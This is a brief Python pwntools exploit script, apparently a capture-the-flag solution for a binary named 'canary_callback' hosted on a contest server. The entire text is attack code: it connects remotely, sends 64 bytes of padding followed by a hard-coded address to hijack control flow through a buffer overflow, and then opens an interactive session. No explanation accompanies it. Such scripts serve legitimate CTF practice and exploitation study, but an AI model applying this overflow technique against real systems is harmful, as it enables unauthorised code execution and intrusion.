#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./canary_callback', checksec=False)

OFFSET_TO_CANARY = 64
p = remote("offsec.m0lecon.it", 13518)
p.recvuntil(b"incantation:\n")
payload = flat(
b"A" * OFFSET_TO_CANARY,
p64(0x00000000004012a3)
)
p.send(payload)
p.interactive()
